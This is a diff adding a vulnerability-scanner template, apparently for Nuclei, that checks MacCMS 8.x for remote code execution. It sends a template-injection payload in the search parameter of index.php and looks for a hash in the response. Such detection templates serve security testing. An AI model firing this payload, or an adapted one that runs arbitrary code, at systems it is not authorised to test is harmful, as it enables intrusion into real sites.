@@ -1,0 +1,31 @@
+id: poc-local-cms-maccms-v8x-index-rce
+
+info:
+  name: poc-local-cms-maccms-v8x-index-rce
+  author: capiton
+  severity: critical
+  description: ""
+  reference:
+    - https://www.cnblogs.com/test404/p/7397755.html
+  metadata:
+    fofa-query: 
+    Vulnerability-Impact: maccms8.x
+  tags: maccms
+
+variables:
+  r: "{{rand_int(10000000, 20000000)}}"
+  md5_r: "{{md5(r)}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/index.php?m=vod-search&wd={if-A:printf(md5({{r}}))}{endif-A}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{md5_r}}"
+        condition: and
+        part: body
+
